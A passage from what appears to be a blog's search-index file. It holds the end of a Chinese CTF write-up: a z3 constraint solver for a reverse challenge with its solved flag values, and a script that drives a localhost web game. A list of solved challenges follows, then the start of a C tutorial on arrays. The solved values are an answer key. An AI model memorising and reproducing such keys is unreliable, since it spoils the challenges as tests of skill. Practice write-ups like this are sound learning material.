class="number">27</span> * x10 + <span class="number">159</span> * x13 + <span class="number">192</span> * x14 + <span class="number">213</span> * x24 + <span class="number">129</span> * x26 + <span class="number">67</span> * x28 + <span class="number">27</span> * x29 + <span class="number">361</span> * x30 == <span class="number">555288</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">106</span> * x29 + <span class="number">363</span> * x28 + <span class="number">210</span> * x27 + <span class="number">171</span> * x26 + <span class="number">289</span> * x25 + <span class="number">240</span> * x24 + <span class="number">164</span> * x23 + <span class="number">342</span> * x22 + <span class="number">391</span> * x19 + <span class="number">304</span> * x18 + <span class="number">218</span> * x17 + <span class="number">32</span> * x16 + <span class="number">350</span> * x15 + <span class="number">339</span> * x12 + <span class="number">303</span> * x11 + <span class="number">222</span> * x10 + <span class="number">298</span> * x9 + <span class="number">47</span> * x8 + <span class="number">48</span> * x6 + <span class="number">264</span> * x4 + <span class="number">113</span> * x3 + <span class="number">275</span> * x2 + <span class="number">345</span> * x1 + <span class="number">312</span> * x0 + <span class="number">171</span> * x5 + <span class="number">384</span> * x7 + <span class="number">175</span> * x13 + <span class="number">5</span> * x14 + <span class="number">113</span> * x20 + <span class="number">19</span> * x21 + <span class="number">263</span> * x30 == <span class="number">637650</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">278</span> * x29 + <span class="number">169</span> * x28 + <span class="number">62</span> * x27 + <span class="number">119</span> * x26 + <span class="number">385</span> * x25 + <span class="number">289</span> * x24 + <span class="number">344</span> * x23 + <span class="number">45</span> * x20 + <span class="number">308</span> * x19 + <span class="number">318</span> * x18 + <span class="number">270</span> * x17 + <span class="number">1</span> * x16 + <span class="number">323</span> * x15 + <span class="number">332</span> * x14 + <span class="number">287</span> * x11 + <span class="number">170</span> * x10 + <span class="number">163</span> * x9 + <span class="number">301</span> * x8 + <span class="number">303</span> * x7 + <span class="number">23</span> * x6 + <span class="number">327</span> * x5 + <span class="number">169</span> * x3 + <span class="number">28</span> * x0 + <span class="number">365</span> * x1 + <span class="number">15</span> * x2 + <span class="number">352</span> * x12 + <span class="number">72</span> * x13 + <span class="number">140</span> * x21 + <span class="number">65</span> * x22 + <span class="number">346</span> * x30 == <span class="number">572609</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">147</span> * x29 + <span class="number">88</span> * x28 + <span class="number">143</span> * x27 + <span class="number">237</span> * x26 + <span class="number">63</span> * x24 + <span class="number">281</span> * x22 + <span class="number">388</span> * x21 + <span class="number">142</span> * x20 + <span class="number">208</span> * x19 + <span class="number">60</span> * x18 + <span class="number">354</span> * x15 + <span class="number">88</span> * x14 + <span class="number">146</span> * x13 + <span class="number">290</span> * x12 + <span class="number">349</span> * x11 + <span class="number">43</span> * x10 + <span class="number">230</span> * x9 + <span class="number">267</span> * x6 + <span class="number">136</span> * x5 + <span class="number">383</span> * x4 + <span class="number">35</span> * x3 + <span class="number">226</span> * x2 + <span class="number">385</span> * x1 + <span class="number">238</span> * x0 + <span class="number">348</span> * x7 + <span class="number">20</span> * x8 + <span class="number">158</span> * x16 + <span class="number">21</span> * x17 + <span class="number">249</span> * x23 + <span class="number">9</span> * x25 + <span class="number">343</span> * x30 == <span class="number">603481</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">29</span> * x29 + <span class="number">323</span> * x26 + <span class="number">159</span> * x25 + <span class="number">118</span> * x20 + <span class="number">326</span> * x19 + <span class="number">211</span> * x18 + <span class="number">225</span> * x17 + <span class="number">355</span> * x16 + <span class="number">201</span> * x15 + <span class="number">149</span> * x14 + <span class="number">296</span> * x13 + <span class="number">184</span> * x12 + <span class="number">315</span> * x11 + <span class="number">364</span> * x10 + <span class="number">142</span> * x9 + <span class="number">75</span> * x8 + <span class="number">313</span> * x7 + <span class="number">142</span> * x6 + <span class="number">396</span> * x5 + <span class="number">348</span> * x4 + <span class="number">272</span> * x3 + <span class="number">26</span> * x2 + <span class="number">206</span> * x1 + <span class="number">173</span> * x0 + <span class="number">155</span> * x21 + <span class="number">144</span> * x22 + <span class="number">366</span> * x23 + <span class="number">257</span> * x24 + <span class="number">148</span> * x27 + <span class="number">24</span> * x28 + <span class="number">253</span> * x30 == <span class="number">664504</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">4</span> * x29 + <span class="number">305</span> * x28 + <span class="number">226</span> * x27 + <span class="number">212</span> * x26 + <span class="number">175</span> * x25 + <span class="number">93</span> * x24 + <span class="number">165</span> * x23 + <span class="number">341</span> * x20 + <span class="number">14</span> * x19 + <span class="number">394</span> * x18 + <span class="number">256</span> * x17 + <span class="number">252</span> * x16 + <span class="number">336</span> * x15 + <span class="number">38</span> * x14 + <span class="number">82</span> * x13 + <span class="number">155</span> * x12 + <span class="number">215</span> * x11 + <span class="number">331</span> * x10 + <span class="number">230</span> * x9 + <span class="number">241</span> * x8 + <span class="number">225</span> * x7 + <span class="number">186</span> * x4 + <span class="number">90</span> * x3 + <span class="number">50</span> * x2 + <span class="number">62</span> * x1 + <span class="number">34</span> * x0 + <span class="number">237</span> * x5 + <span class="number">11</span> * x6 + <span class="number">336</span> * x21 + <span class="number">36</span> * x22 + <span class="number">29</span> * x30 == <span class="number">473092</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">353</span> * x29 + <span class="number">216</span> * x28 + <span class="number">252</span> * x27 + <span class="number">8</span> * x26 + <span class="number">62</span> * x25 + <span class="number">233</span> * x24 + <span class="number">254</span> * x23 + <span class="number">303</span> * x22 + <span class="number">234</span> * x21 + <span class="number">303</span> * x20 + <span class="number">256</span> * x19 + <span class="number">148</span> * x18 + <span class="number">324</span> * x17 + <span class="number">317</span> * x16 + <span class="number">213</span> * x15 + <span class="number">309</span> * x14 + <span class="number">28</span> * x13 + <span class="number">280</span> * x11 + <span class="number">118</span> * x10 + <span class="number">58</span> * x9 + <span class="number">50</span> * x8 + <span class="number">155</span> * x7 + <span class="number">161</span> * x6 + <span class="number">64</span> * x5 + <span class="number">303</span> * x4 + <span class="number">76</span> * x3 + <span class="number">43</span> * x2 + <span class="number">109</span> * x1 + <span class="number">102</span> * x0 + <span class="number">93</span> * x30 == <span class="number">497492</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">89</span> * x29 + <span class="number">148</span> * x28 + <span class="number">82</span> * x27 + <span class="number">53</span> * x26 + <span class="number">274</span> * x25 + <span class="number">220</span> * x24 + <span class="number">202</span> * x23 + <span class="number">123</span> * x22 + <span class="number">231</span> * x21 + <span class="number">169</span> * x20 + <span class="number">278</span> * x19 + <span class="number">259</span> * x18 + <span class="number">208</span> * x17 + <span class="number">219</span> * x16 + <span class="number">371</span> * x15 + <span class="number">181</span> * x12 + <span class="number">104</span> * x11 + <span class="number">392</span> * x10 + <span class="number">285</span> * x9 + <span class="number">113</span> * x8 + <span class="number">298</span> * x7 + <span class="number">389</span> * x6 + <span class="number">322</span> * x5 + <span class="number">338</span> * x4 + <span class="number">237</span> * x3 + <span class="number">234</span> * x0 + <span class="number">261</span> * x1 + <span class="number">10</span> * x2 + <span class="number">345</span> * x13 + <span class="number">3</span> * x14 + <span class="number">361</span> * x30 == <span class="number">659149</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">361</span> * x29 + <span class="number">359</span> * x28 + <span class="number">93</span> * x27 + <span class="number">315</span> * x26 + <span class="number">69</span> * x25 + <span class="number">137</span> * x24 + <span class="number">69</span> * x23 + <span class="number">58</span> * x22 + <span class="number">300</span> * x21 + <span class="number">371</span> * x20 + <span class="number">264</span> * x19 + <span class="number">317</span> * x18 + <span class="number">215</span> * x17 + <span class="number">155</span> * x16 + <span class="number">215</span> * x15 + <span class="number">330</span> * x14 + <span class="number">239</span> * x13 + <span class="number">212</span> * x12 + <span class="number">88</span> * x11 + <span class="number">82</span> * x10 + <span class="number">354</span> * x9 + <span class="number">85</span> * x8 + <span class="number">310</span> * x7 + <span class="number">84</span> * x6 + <span class="number">374</span> * x5 + <span class="number">380</span> * x4 + <span class="number">215</span> * x3 + <span class="number">351</span> * x2 + <span class="number">141</span> * x1 + <span class="number">115</span> * x0 + <span class="number">108</span> * x30 == <span class="number">629123</span>)</span><br><span class="line"></span><br><span class="line">print(solver.check())</span><br><span class="line">print(solver.model())</span><br><span class="line"></span><br><span class="line"># x29 = <span class="number">33</span>,</span><br><span class="line">#  x18 = <span class="number">69</span>,</span><br><span class="line">#  x22 = <span class="number">116</span>,</span><br><span class="line">#  x0 = <span class="number">109</span>,</span><br><span class="line">#  x3 = <span class="number">99</span>,</span><br><span class="line">#  x7 = <span class="number">121</span>,</span><br><span class="line">#  x23 = <span class="number">105</span>,</span><br><span class="line">#  x11 = <span class="number">115</span>,</span><br><span class="line">#  x30 = <span class="number">125</span>,</span><br><span class="line">#  x13 = <span class="number">108</span>,</span><br><span class="line">#  x20 = <span class="number">117</span>,</span><br><span class="line">#  x1 = <span class="number">111</span>,</span><br><span class="line">#  x10 = <span class="number">95</span>,</span><br><span class="line">#  x16 = <span class="number">100</span>,</span><br><span class="line">#  x25 = <span class="number">110</span>,</span><br><span class="line">#  x21 = <span class="number">97</span>,</span><br><span class="line">#  x26 = <span class="number">115</span>,</span><br><span class="line">#  x6 = <span class="number">123</span>,</span><br><span class="line">#  x2 = <span class="number">101</span>,</span><br><span class="line">#  x12 = <span class="number">48</span>,</span><br><span class="line">#  x19 = <span class="number">113</span>,</span><br><span class="line">#  x24 = <span class="number">48</span>,</span><br><span class="line">#  x9 = <span class="number">117</span>,</span><br><span class="line">#  x4 = <span class="number">116</span>,</span><br><span class="line">#  x5 = <span class="number">102</span>,</span><br><span class="line">#  x17 = <span class="number">95</span>,</span><br><span class="line">#  x8 = <span class="number">48</span>,</span><br><span class="line">#  x14 = <span class="number">118</span>,</span><br><span class="line">#  x28 = <span class="number">33</span>,</span><br><span class="line">#  x27 = <span class="number">33</span>,</span><br><span class="line">#  x15 = <span class="number">51</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;x29&#x27;</span>: <span class="number">33</span>,</span><br><span class="line">    <span class="string">&#x27;x18&#x27;</span>: <span class="number">69</span>,</span><br><span class="line">    <span class="string">&#x27;x22&#x27;</span>: <span class="number">116</span>,</span><br><span class="line">    <span class="string">&#x27;x0&#x27;</span>: <span class="number">109</span>,</span><br><span class="line">    <span class="string">&#x27;x3&#x27;</span>: <span class="number">99</span>,</span><br><span class="line">    <span class="string">&#x27;x7&#x27;</span>: <span class="number">121</span>,</span><br><span class="line">    <span class="string">&#x27;x23&#x27;</span>: <span class="number">105</span>,</span><br><span class="line">    <span class="string">&#x27;x11&#x27;</span>: <span class="number">115</span>,</span><br><span class="line">    <span class="string">&#x27;x30&#x27;</span>: <span class="number">125</span>,</span><br><span class="line">    <span class="string">&#x27;x13&#x27;</span>: <span class="number">108</span>,</span><br><span class="line">    <span class="string">&#x27;x20&#x27;</span>: <span class="number">117</span>,</span><br><span class="line">    <span class="string">&#x27;x1&#x27;</span>: <span class="number">111</span>,</span><br><span class="line">    <span class="string">&#x27;x10&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">    <span class="string">&#x27;x16&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">    <span class="string">&#x27;x25&#x27;</span>: <span class="number">110</span>,</span><br><span class="line">    <span class="string">&#x27;x21&#x27;</span>: <span class="number">97</span>,</span><br><span class="line">    <span class="string">&#x27;x26&#x27;</span>: <span class="number">115</span>,</span><br><span class="line">    <span class="string">&#x27;x6&#x27;</span>: <span class="number">123</span>,</span><br><span class="line">    <span class="string">&#x27;x2&#x27;</span>: <span class="number">101</span>,</span><br><span class="line">    <span class="string">&#x27;x12&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">    <span class="string">&#x27;x19&#x27;</span>: <span class="number">113</span>,</span><br><span class="line">    <span class="string">&#x27;x24&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">    <span class="string">&#x27;x9&#x27;</span>: <span class="number">117</span>,</span><br><span class="line">    <span class="string">&#x27;x4&#x27;</span>: <span class="number">116</span>,</span><br><span class="line">    <span class="string">&#x27;x5&#x27;</span>: <span class="number">102</span>,</span><br><span class="line">    <span class="string">&#x27;x17&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">    <span class="string">&#x27;x8&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">    <span class="string">&#x27;x14&#x27;</span>: <span class="number">118</span>,</span><br><span class="line">    <span class="string">&#x27;x28&#x27;</span>: <span class="number">33</span>,</span><br><span class="line">    <span class="string">&#x27;x27&#x27;</span>: <span class="number">33</span>,</span><br><span class="line">    <span class="string">&#x27;x15&#x27;</span>: <span class="number">51</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># # 按照 x 后的数字进行排序</span><br><span class="line"># sorted_data = sorted(data.items(), key=lambda item: <span class="type">int</span>(item[<span class="number">0</span>][<span class="number">1</span>:]))</span><br><span class="line">#</span><br><span class="line"># # 重组数据</span><br><span class="line"><span class="meta"># result = <span class="string">&#x27;&#x27;.join(chr(value) for key, value in sorted_data)</span></span></span><br><span class="line"><span class="string"><span class="meta">#</span></span></span><br><span class="line"><span class="string"><span class="meta"># print(result)</span></span></span><br></pre></td></tr></table></figure><h1 id="web">Web</h1><h2 id="gas-gas-gas">gas!gas!gas!</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gas gas gas</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;driver&#x27;</span>: <span class="string">&#x27;wahaha&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;steering_control&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,  <span class="comment"># 直行0,左转-1,右转1</span></span><br><span class="line">    <span class="string">&#x27;throttle&#x27;</span>: <span class="string">&#x27;1&#x27;</span>  <span class="comment"># 松开0,保持1,全开2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">text_list = []</span><br><span class="line"><span class="comment"># r = requests.post(url=&#x27;http://localhost:6664/&#x27;, data=data)</span></span><br><span class="line"><span class="comment"># cookie = r.cookies.get_dict()</span></span><br><span class="line"><span class="comment"># print(cookie)</span></span><br><span class="line">cookie = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">times = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前设置:&#x27;</span> + <span class="string">&#x27;方向:&#x27;</span> + data[<span class="string">&#x27;steering_control&#x27;</span>] + <span class="string">&#x27;,油门&#x27;</span> + data[<span class="string">&#x27;throttle&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> cookie == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        r = requests.post(url=<span class="string">&#x27;http://localhost:6664/&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.post(url=<span class="string">&#x27;http://localhost:6664/&#x27;</span>, data=data, cookies=cookie)</span><br><span class="line">    cookie = r.cookies.get_dict()</span><br><span class="line">    <span class="comment"># print(&#x27;cookie&#x27;,cookie)</span></span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;cookie: &#x27;</span>, cookie)</span><br><span class="line">    pattern_text = re.<span class="built_in">compile</span>(<span class="string">&#x27;&gt;弯道(.*?)&lt;&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_text, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提示:弯道反向打方向盘</span></span><br><span class="line">    <span class="comment"># 弯道</span></span><br><span class="line">    pattern_right = re.<span class="built_in">compile</span>(<span class="string">&#x27;弯道向右&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_right, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        data[<span class="string">&#x27;steering_control&#x27;</span>] = <span class="string">&#x27;-1&#x27;</span></span><br><span class="line"></span><br><span class="line">    pattern_left = re.<span class="built_in">compile</span>(<span class="string">&#x27;弯道向左&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_left, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        data[<span class="string">&#x27;steering_control&#x27;</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    pattern_right = re.<span class="built_in">compile</span>(<span class="string">&#x27;弯道直行&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_right, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        data[<span class="string">&#x27;steering_control&#x27;</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提示:抓地力小,减小油门</span></span><br><span class="line">    <span class="comment"># 油门</span></span><br><span class="line">    pattern_gas_keep = re.<span class="built_in">compile</span>(<span class="string">&#x27;保持这个速度&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_gas_keep, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line">        data[<span class="string">&#x27;throttle&#x27;</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    pattern_gas_belower = re.<span class="built_in">compile</span>(<span class="string">&#x27;抓地力太小了&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_gas_belower, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line">        data[<span class="string">&#x27;throttle&#x27;</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">    pattern_gas_behigher = re.<span class="built_in">compile</span>(<span class="string">&#x27;抓地力太大了&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_gas_behigher, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line">        data[<span class="string">&#x27;throttle&#x27;</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=============================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    text_list.append(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">    <span class="built_in">print</span>(text_list[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=================================================&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=================================================&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="解出的题目记录">解出的题目记录</h1><p>回头看的时候有个记录…</p><h2 id="reverse">Reverse</h2><p>base_64,UPX!,Xor,ANDROID,RRRRRc4,SMC,EQUATION,junk_code</p><h2 id="web">Web</h2><p>http,彼岸的flag,cookie,gas!gas!gas!,大海捞针</p><h2 id="misc">Misc</h2><p>打不开的图片2,狗子(1)普通的猫</p><h2 id="pwn">PWN</h2><p>test_nc,baby_calculator,fd,int_overflow,ret2text_32,ret2text_64,shellcode_level0,shellcode_level1(这题貌似没通?但是文件夹里有个exp?)</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-10-数组</title>
      <link href="/2023b7fda0df05ff/"/>
      <url>/2023b7fda0df05ff/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是数组">什么是数组</h1><p>数据往往不是各不相关的,我们需要处理的数据往往是一系列大量的相同类型的值,有着完全相同行为和作用.</p><p>例如一个班级的所有学生的各个学号,它们都是一个个固定长度的正整数,均用于唯一识别一名学生;</p><p>再例如一家超市的所有商品名,它们都是一个个的字符串.</p><p>对于这些同类型的,并且往往是大量的数据,我们显然不能像过去那样分别声明一个个单独的变量去存储:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> stu1=<span class="number">10001</span>;</span><br><span class="line">    <span class="type">int</span> stu2=<span class="number">10002</span>;</span><br><span class="line">    <span class="type">int</span> stu3=<span class="number">10003</span>;</span><br><span class="line">    <span class="type">int</span> stu4=<span class="number">10004</span>;</span><br><span class="line">    <span class="type">int</span> stu5=<span class="number">10006</span>;</span><br><span class="line">    <span class="type">int</span> stu6=<span class="number">10007</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然,这样的存储非常繁琐,并且限制非常大,各个变量都是互相独立的(尽管他们的变量名都相似),如果我们重新编排学号,例如从100开头变为200开头,我们只能一个个的去设置:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> stu1=<span class="number">10001</span>;</span><br><span class="line">    <span class="type">int</span> stu2=<span class="number">10002</span>;</span><br><span class="line">    <span class="type">int</span> stu3=<span class="number">10003</span>;</span><br><span class="line">    <span class="type">int</span> stu4=<span class="number">10004</span>;</span><br><span class="line">    <span class="type">int</span> stu5=<span class="number">10006</span>;</span><br><span class="line">    <span class="type">int</span> stu6=<span class="number">10007</span>;</span><br><span class="line">    </span><br><span class="line">    stu1 = <span class="number">20001</span>;</span><br><span class="line">    stu2 = <span class="number">20002</span>;</span><br><span class="line">    stu3 = <span class="number">20003</span>;</span><br><span class="line">    stu4 = <span class="number">20004</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样显然不现实,幸运的是,高级语言提供了各种用于存储这种一系列值的功能.</p><p>C语言中使用<code>数组</code>来存储大量的相同类型的值,我们可以在声明数组的时候设置其长度,即可以存储的具体数量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> students[<span class="number">6</span>] = &#123;</span><br><span class="line">            <span class="number">10001</span>, <span class="number">10002</span>, <span class="number">10003</span>, <span class="number">10004</span>, <span class="number">10006</span>, <span class="number">10007</span></span><br><span class="line">    &#125;; <span class="comment">// 声明并初始化一个数组用于存储各个学号,数组的长度为6,代表最多可以存储6个学号</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        students[i] = <span class="number">20000</span> + i + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="comment">// 使用循环&quot;遍历&quot;数组中的每个&quot;元素&quot;,并对其进行修改,注意元素&quot;下标&quot;从0到5而不是从1到6</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, students[i]);</span><br><span class="line">    &#125; <span class="comment">// 同样使用循环来遍历数组中的每个元素,只不过这次我们对其输出而不是修改值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="c语言的数组">C语言的数组</h1><p>事实上,数组是线性分配的,也就是说,一个数组的每个元素在内存中是紧挨着的存储(分配)的.</p><p>例如一个长度为10的int数组,一共占用4x10个,也就是40个字节,其中4为一个int变量占用的空间.</p><p>下面介绍数组的最基本的内容.</p><h2 id="已知常量大小数组">已知常量大小数组</h2><p>C语言中一般的数组<code>(已知常量大小数组)</code>的声明语法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;元素类型&gt; &lt;数组名&gt;[数组长度];</span><br></pre></td></tr></table></figure><ol><li><p>元素类型</p><p>可以是任意基本类型,例如<code>int</code>,<code>double</code>,<code>char</code>等</p><p>也可以是像结构体这样的自定义类型</p><p>元素类型指定了整个数组的每一个元素的类型</p></li><li><p>数组名</p><p>数组名一样也是标识符,同样要遵循标识符的命名规范,和单个变量一样,数组名唯一标识了整个数组</p></li><li><p>数组长度</p><p>数组长度必须是<code>整数常量表达式</code>,说简单点,必须是能直接算出来的常数,而且必须是整数</p><p>例如<code>2*3</code>,<code>100</code>这些都是允许的,反之,<code>2*i</code>这样的表达式就是不允许的(但不是绝对,后面提到的VLA就允许)</p></li></ol><p>对数组元素进行访问十分简单:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;数组名&gt;[下标]</span><br></pre></td></tr></table></figure><p>C语言中(所有的编程语言)数组的下标都是从0开始的,这种设计十分合理,读者自行百度了解</p><p>我们要访问数组a的第1个元素,则它的下标(也就是编号)就是0,我们要访问它,只需要<code>a[0]</code>即可</p><p>例如,我可以定义长度为10的int数组来存1~10这10个数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 